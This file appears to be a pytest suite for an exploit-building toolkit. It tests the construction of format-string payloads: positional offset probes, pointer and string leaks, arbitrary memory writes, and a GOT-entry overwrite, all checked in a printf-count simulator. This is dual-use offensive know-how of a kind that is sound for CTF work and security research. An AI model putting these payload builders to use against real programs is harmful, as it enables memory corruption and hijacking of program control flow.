"""Deterministic format-string/GOT payload tests with a pure printf-count oracle."""
from pathlib import Path
import sys

import pytest

REPO = Path(__file__).resolve().parent.parent
sys.path.insert(0, str(REPO / "solvers" / "toolkits"))

import format_string_builder as fmt  # noqa: E402
from contract import BuildError  # noqa: E402


def test_offset_probe_marks_every_positional_directive_and_discovers_unique_slot():
    build = fmt.build_offset_probe(start=1, stop=8, marker=b"R5B!R5B!")
    assert build.payload.startswith(b"R5B!R5B!|%1$p")
    assert build.slice("probe[8]") == b"|%8$p"
    marker_word = int.from_bytes(b"R5B!R5B!", "little")
    output = "|".join(["0x1", "0x2", hex(marker_word), "0x4"])
    assert fmt.discover_marker_slot(output) == 3
    assert fmt.discover_marker_slot(output + "|" + hex(marker_word)) is None


def test_positional_pointer_and_dereference_leaks_have_exact_boundaries():
    pointer = fmt.build_positional_leak(argument_index=11, conversion="p", prefix=b"BEGIN:")
    assert pointer.payload == b"BEGIN:%11$p"
    assert pointer.slice("directive") == b"%11$p"

    deref = fmt.build_positional_leak(
        argument_index=17,
        conversion="s",
        address=0x404018,
        prefix=b"LEAK[",
        suffix=b"]",
    )
    assert deref.slice("directive") == b"%17$s"
    assert int.from_bytes(deref.slice("address"), "little") == 0x404018
    assert deref.payload[deref.placements["address"] - 1] == ord("P")

    bounded = fmt.build_positional_leak(
        argument_index=17, conversion="s", address=0x404018, max_bytes=64
    )
    assert bounded.slice("directive") == b"%17$.64s"


@pytest.mark.parametrize("atom_size", [1, 2, 4])
def test_arbitrary_write_payload_round_trips_in_count_simulator(atom_size):
    value_width = 8 if atom_size in {1, 2} else 4
    value = 0x1122334455667788 if value_width == 8 else 0x00001000
    build = fmt.build_fmt_writes(
        {0x404040: value},
        first_address_arg=12,
        word_size=8,
        value_width=value_width,
        atom_size=atom_size,
        numbwritten=7,
        prefix=b"PRE",
    )
    observed = fmt.simulate_positional_writes(build, numbwritten=7)
    expected = {
        0x404040 + offset: int.from_bytes(
            value.to_bytes(value_width, "little")[offset:offset + atom_size], "little"
        )
        for offset in range(0, value_width, atom_size)
    }
    assert observed == expected
    assert build.placements["address_table"] % 8 == 0
    assert all(b"$" in build.slice(f"write[{index}].directive")
               for index in range(value_width // atom_size))


def test_byte_values_and_multiple_targets_are_sorted_deterministically():
    writes = {0x601000: b"AB", 0x601010: b"\x02\xff"}
    first = fmt.build_fmt_writes(writes, first_address_arg=20, value_width=2, atom_size=1)
    second = fmt.build_fmt_writes(dict(reversed(tuple(writes.items()))), first_address_arg=20,
                                  value_width=2, atom_size=1)
    assert first.payload == second.payload
    assert first.placements == second.placements
    assert fmt.simulate_positional_writes(first) == {
        0x601000: 0x41,
        0x601001: 0x42,
        0x601010: 0x02,
        0x601011: 0xFF,
    }


def test_got_auto_exploit_writes_replacement_pointer_and_maps_each_address():
    build = fmt.build_fmt_got_overwrite(
        got_address=0x404018,
        replacement_address=0x7FFFF7E12340,
        first_address_arg=8,
        atom_size=2,
        partial_width=6,
        numbwritten=5,
    )
    assert build.strategy == "format-string-to-got"
    assert build.metadata["got_address"] == "0x404018"
    memory = fmt.simulate_positional_writes(build, numbwritten=5)
    expected_raw = (0x7FFFF7E12340).to_bytes(6, "little")
    assert memory == {
        0x404018 + offset: int.from_bytes(expected_raw[offset:offset + 2], "little")
        for offset in range(0, 6, 2)
    }
    for index in range(3):
        assert len(build.slice(f"write[{index}].address")) == 8


def test_format_builders_reject_unsafe_or_ambiguous_requests():
    with pytest.raises(BuildError, match="NUL"):
        fmt.build_offset_probe(marker=b"A\x00B")
    with pytest.raises(BuildError, match="meaningful only"):
        fmt.build_positional_leak(argument_index=4, conversion="p", address=0x404000)
    with pytest.raises(BuildError, match="conflicting overlapping"):
        fmt.build_fmt_writes(
            {0x404000: b"AB", 0x404001: b"Z"},
            first_address_arg=6,
            value_width=2,
            atom_size=1,
        )
    with pytest.raises(BuildError, match="forbidden bytes"):
        fmt.build_fmt_got_overwrite(
            got_address=0x4141414141414141,
            replacement_address=0x42,
            first_address_arg=6,
            bad_bytes={0x41},
        )
    with pytest.raises(BuildError, match="would print"):
        fmt.build_fmt_writes(
            {0x404000: 0xF0000000}, first_address_arg=6,
            value_width=4, atom_size=4, max_printed=10_000,
        )

